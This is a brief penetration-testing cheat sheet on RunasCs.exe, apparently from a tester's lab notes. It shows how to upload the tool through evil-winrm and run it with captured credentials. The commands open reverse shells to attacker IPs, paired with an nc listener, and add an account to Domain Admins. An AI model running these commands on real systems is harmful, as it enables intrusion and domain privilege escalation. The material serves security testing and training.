


# RunasCs.exe


### Remote connections
RunasCs.exe from: https://github.com/antonioCoco/RunasCs/releases. Forked in the tester repo: https://github.com/amandaguglieri/RunasCs

```powershell

# Initiates a remote shell as that user
.\RunasCs.exe administrator Mypassword123 cmd.exe -r 192.168.45.211:443
```


Logged as user1 with evil-winrm we cannot run psexec or any other tool requiring to confirm a modal, since we only have terminal access. 

However, the tester can use the binary RunasCs.exe from: https://github.com/antonioCoco/RunasCs/releases. Forked in the tester repo: https://github.com/amandaguglieri/RunasCs

Upload the binary to the machine:

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> upload RunasCs.exe
```

Set a listener in a different terminal from the attacker's machine:

```bash
nc -lnvp 1234
```

Run a reverse shell:

```bash
.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.129:1234 
```


## Run a command

```
.\RunasCS.exe svc_helpdesk U299iYRmikYTHDbPbxPoYYfa2j4x4cdg  "powershell.exe -c Add-DomainGroupMember -Identity 'Domain Admins' Members svc_helpdesk"
```